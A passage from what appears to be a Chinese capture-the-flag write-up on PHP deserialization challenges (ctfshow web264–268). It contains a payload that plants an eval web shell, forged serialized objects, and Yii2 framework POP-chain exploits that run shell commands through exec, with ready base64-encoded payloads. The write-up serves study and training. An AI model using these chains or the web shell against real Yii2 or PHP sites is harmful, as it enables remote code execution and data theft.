@eval($_POST[1]);?&gt;”;s:6:”status”;N;}</p><p>那么，我们只需要在O的前面加上<code>|</code>，就可以把前面都视为类名。同时，反序列化会在遇到第一个<code>&#125;</code>之后终止，不会继续读取后面的内容，所以不用担心后面的<code>&quot;&#125;</code>会影响反序列化。可控的部分只需要传入User类的序列化字符串再base64编码即可</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNToiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span><br></pre></td></tr></table></figure><p>将cookie中的limit改成这个值，访问index.php，再访问inc/inc.php，最后访问写入的shell即可</p><h1 id="web264-session"><a href="#web264-session" class="headerlink" title="web264(session)"></a>web264(session)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<strong>message.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?f=<span class="number">1</span>&amp;m=<span class="number">1</span>&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">访问message.php页面</span></span><br><span class="line"><span class="string">Cookie msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO2k6MTtzOjM6Im1zZyI7aToxO3M6MjoidG8iOw== </span></span><br><span class="line"><span class="string">刷新message.php页面</span></span><br></pre></td></tr></table></figure><ul><li>题与web262类似，本题多了个session</li><li>利用之前的payload修改token的值为admin，访问message.php，发现需要从Cookie中取，利用session反序列化知识</li></ul><blockquote><p>将序列化内容进行base64编码<br>O:7:”message”:4:{s:4:”from”;i:1;s:3:”msg”;i:1;s:2:”to”;<br>Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO2k6MTtzOjM6Im1zZyI7aToxO3M6MjoidG8iOw==</p><p>Cookie中，增加一个变量<br>msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO2k6MTtzOjM6Im1zZyI7aToxO3M6MjoidG8iOw==</p><p>刷新即可</p></blockquote><h1 id="web265-引用"><a href="#web265-引用" class="headerlink" title="web265(引用)"></a>web265(引用)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?ctfshow=O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</code></p><ul><li>发现本体需要两个变量的值相等才行，又发现其中一个值为随机值</li><li>利用<code>=&amp;</code>将两个变量引用到一起，使两个属性的值相等</li></ul><h1 id="web266"><a href="#web266" class="headerlink" title="web266()"></a>web266()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post </span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;CTFSHOW&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><ul><li>发现<code>$cs = file_get_contents(&#39;php://input&#39;);</code>可以得知我们需要构造post数据</li><li>if判断表明构造的数据不能有<code>ctfshow</code>反序列化不区分大小写，所以我们可以利用大小写进行绕过</li><li>直接构造进行post传参</li></ul><h1 id="web267-Yii"><a href="#web267-Yii" class="headerlink" title="web267(Yii)"></a>web267(Yii)</h1><ul><li>进去发现是一个页面，先扫目录，没有什么结果，试着弱口令登录</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267.png" alt=""></p><ul><li>发现密码为admin/admin，且about页面发生变化</li></ul><p><strong>登陆前</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_01.png" alt=""></p><p><strong>登陆后</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_02.png" alt=""></p><ul><li>查看源码发现提示</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_03.png" alt=""></p><ul><li>拼接url发现如下提示，<code>?r=site%2Fabout&amp;view-source</code></li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_04.png" alt=""></p><ul><li>卡住了。。。搜一下发现这是个框架，用Wappalyzer工具发现是Yii框架，直接百度搜</li></ul><p>参考博客：<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">Yii2 反序列化漏洞</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">    <span class="comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功显示phpinfo界面</p><p>网站过滤了system，所以可以换用shell_exec，而且执行sys命令的时候，网页只会显示</p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/267_05.png" alt=""></p><p>所以可以考虑用cp复制，然后url访问。</p><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;<span class="comment">// 函数</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cp /flag /var/www/html/basic/web/1.txt&#x27;</span>;<span class="comment">// 参数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NDoiZXhlYyI7czoyOiJpZCI7czozODoiY3AgL2ZsYWcgL3Zhci93d3cvaHRtbC9iYXNpYy93ZWIvMS50eHQiO31pOjE7czozOiJydW4iO319fX0=</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?r=<span class="comment">///backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NDoiZXhlYyI7czoyOiJpZCI7czozODoiY3AgL2ZsYWcgL3Zhci93d3cvaHRtbC9iYXNpYy93ZWIvMS50eHQiO31pOjE7czozOiJydW4iO319fX0=</span></span><br><span class="line">访问<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><h1 id="web268-Yii-plus"><a href="#web268-Yii-plus" class="headerlink" title="web268(Yii plus)"></a>web268(Yii plus)</h1><ul><li><p>跟上题差不多，试着用上题的payload试验一下，发现不好使了。。。</p></li><li><p>换个新的<strong>exp</strong></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">IndexAction</span>&#123;</span><br><span class="line">            <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;cp /f* 1.txt&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">IndexAction</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">IndexAction</span>(), <span class="string">&#x27;run&#x27;</span>]; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span> </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;processes[]=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;        </span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">Codeception</span>\<span class="title class_">Extension</span>\<span class="title class_">RunProcess</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title 